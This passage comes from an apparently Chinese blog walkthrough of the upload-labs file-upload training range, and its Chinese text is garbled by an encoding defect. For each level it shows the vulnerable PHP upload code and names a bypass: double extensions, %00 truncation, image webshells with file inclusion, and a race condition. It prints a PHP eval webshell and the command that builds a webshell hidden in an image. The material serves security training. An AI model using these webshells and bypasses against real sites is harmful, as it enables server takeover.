class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><p>+++</p><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•</strong>;</p><ul><li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">ç”¨str_ireplaceå‡½æ•°å°†ç¬¦åˆé»‘åå•ä¸­çš„åç¼€åè¿›è¡Œæ›¿æ¢ä¸ºç©º</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>ç»•è¿‡æ–¹å¼ï¼š<strong>åŒå†™ç»•è¿‡</strong>ï¼›</li></ul><p>+++</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š<strong>æç¤ºï¼šåªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼</strong>            </p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passä¸Šä¼ è·¯å¾„å¯æ§ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><p>+++</p><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯ç™½åå•</strong>;</p><ul><li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>,<span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"><span class="comment">// $img_pathç›´æ¥æ‹¼æ¥</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>ç»•è¿‡æ–¹å¼ï¼š<strong>åˆ©ç”¨%00æˆªæ–­ç»•è¿‡</strong>ï¼›</p><ul><li>éœ€å…³é—­magic_quotes_gpc</li><li>php ç‰ˆæœ¬&lt;5.3.4</li></ul></li></ul><p>+++</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š<strong>æç¤ºï¼šåªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼</strong>            </p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passä¸Šä¼ è·¯å¾„å¯æ§ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å¤±è´¥"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><p>+++</p><ul><li>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯ç™½åå•</strong>;</li></ul><ul><li><p>ç»•è¿‡æ–¹å¼ï¼š</p><p><strong>åˆ©ç”¨%00æˆªæ–­ç»•è¿‡</strong>ï¼›è¿™ä¸€å…³å’ŒPass-11çš„åŒºåˆ«æ˜¯ï¼Œ00æˆªæ–­æ˜¯ç”¨åœ¨POSTä¸­ï¼Œä¸”æ˜¯åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹ã€‚å› ä¸ºPOSTä¸ä¼šåƒGETé‚£æ ·å¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚/åœ¨BPä¸­é€‰ä¸­%00å³é”®ï¼Œå¯ä»¥ç›´æ¥ç¼–ç ï¼›</p><ul><li>éœ€å…³é—­magic_quotes_gpc</li><li>php ç‰ˆæœ¬&lt;5.3.4</li></ul></li></ul><p>+++</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*<em>æç¤ºï¼šæ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼ *</em>            </p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passæ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><p>+++</p><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯ç™½åå•</strong>;<strong>getReailFileTypeå‡½æ•°åªä¼šè¯»å–æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚</strong></p><ul><li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">$bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>ç»•è¿‡æ–¹å¼ï¼š<strong>å›¾ç‰‡é©¬+æ–‡ä»¶åŒ…å«åˆ©ç”¨</strong>ï¼›</p><ul><li><p>åˆ¶ä½œå›¾ç‰‡é©¬ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy <span class="number">1</span>.jpg/<span class="selector-tag">a</span> + <span class="number">1</span>.txt/<span class="selector-tag">b</span> <span class="number">2</span>.jpg</span><br><span class="line"><span class="comment">//1.txtä¸­çš„å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œ1.jpgåˆ™æ˜¯ä¸€å¼ å›¾ç‰‡ã€‚ç”Ÿæˆçš„å›¾ç‰‡é©¬æ˜¯2.jpg</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨include.phpå®ç°æ–‡ä»¶åŒ…å«</p></li><li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æœ¬é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨äºæµ‹è¯•å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸è¿è¡Œï¼</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>èšå‰‘è¿æ¥</li></ul><p>+++</p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*<em>æç¤ºï¼šæ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼ *</em>            </p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passä½¿ç”¨getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><p>+++</p><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯ç™½åå•**</strong>;æ ¡éªŒäº†æ–‡ä»¶å¤´**</p><ul><li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>ç»•è¿‡æ–¹å¼ï¼š<strong>å›¾ç‰‡é©¬+æ–‡ä»¶åŒ…å«åˆ©ç”¨</strong>ï¼›</li></ul><p>+++</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>éœ€è¦å¼€å¯php_exifæ¨¡å—</p><p>ç»•è¿‡æ–¹å¼ï¼š<strong>å›¾ç‰‡é©¬+æ–‡ä»¶åŒ…å«åˆ©ç”¨</strong>ï¼›</p><p>+++</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>è¿™é‡Œä½¿ç”¨å®¹æ˜“ç»•è¿‡äºŒæ¬¡æ¸²æŸ“çš„gifæ–‡ä»¶ã€‚ç°åœ¨åˆ¶ä½œä¸€ä¸ªgifå›¾ç‰‡é©¬ï¼Œcopyå°±å¯ä»¥äº†ã€‚ä¹Ÿå¯ä»¥winhexåˆ¶ä½œã€‚</p><p>åˆ¶ä½œåä¾¿ä¸Šä¼ ï¼Œå‘ç°æ— æ³•åˆ©ç”¨ã€‚ç„¶åå°†ä¸Šä¼ çš„å›¾ç‰‡é‡æ–°ä¸‹è½½ä¸‹æ¥ï¼Œæ”¾å…¥winhexï¼Œè¿›è¡Œå¯¹æ¯”ã€‚</p><p>å¯ä»¥æ‰¾åˆ°äºŒæ¬¡æ¸²æŸ“åä¸å˜çš„åœ°æ–¹ï¼Œè€Œè¿™ä¸ªåœ°æ–¹å°±æ˜¯å¯ä»¥æ’å…¥ä¸€å¥è¯çš„åœ°æ–¹ã€‚</p><p>ä¸Šä¼ ä¿®æ”¹å¥½çš„å›¾ç‰‡é©¬ï¼Œèšå‰‘è¿æ¥æˆåŠŸã€‚</p><p><strong>å›¾ç‰‡é©¬äºŒæ¬¡æ¸²æŸ“</strong></p><p>+++</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>ç™½åå•éªŒè¯ï¼Œæ¡ä»¶ç«äº‰</strong></p><p>è¿™ä¸€å…³æ˜¯å…ˆä¸Šä¼ å†åˆ¤æ–­ï¼Œæ‰€ä»¥å®åœ¨åˆ¤æ–­å‰å°±å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œè¯·æ±‚ã€‚</p><p>å…ˆåˆ›å»ºä¸€ä¸ªwebshell.phpï¼Œå†…å®¹ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST["cmd"]) ?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†ä½¿ç”¨pythonä¸æ–­è¯·æ±‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    requests.get(<span class="string">"http://localhost/upload-labs/upload/webshell.php"</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œpythonä»£ç ï¼Œå†å¼€å§‹ä¸Šä¼ phpæ–‡ä»¶ã€‚</p><p>çœ‹æ˜¯å¦æœ‰shell.php;</p><p>èšå‰‘è¿æ¥ï¼›</p><p>+++</p><h1 id="Upload-Labs-æ–‡ä»¶ä¸Šä¼ "><a href="#Upload-Labs-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="Upload Labs æ–‡ä»¶ä¸Šä¼ "></a>Upload Labs æ–‡ä»¶ä¸Šä¼ </h1><p><strong>é¡¹ç›®åœ°å€</strong>ï¼š<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p><h2 id="ç¬¬1å…³-å‰ç«¯jsç»•è¿‡"><a href="#ç¬¬1å…³-å‰ç«¯jsç»•è¿‡" class="headerlink" title="ç¬¬1å…³ å‰ç«¯jsç»•è¿‡"></a>ç¬¬1å…³ å‰ç«¯jsç»•è¿‡</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">            alert(<span class="string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">        <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">        <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> + allow_ext + <span class="string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><ul><li>å‰ç«¯ç¦ç”¨js</li><li>æŠ“åŒ…ç»•è¿‡</li></ul><h2 id="ç¬¬2å…³-content-type"><a href="#ç¬¬2å…³-content-type" class="headerlink" title="ç¬¬2å…³ content-type"></a>ç¬¬2å…³ content-type</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];          </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span 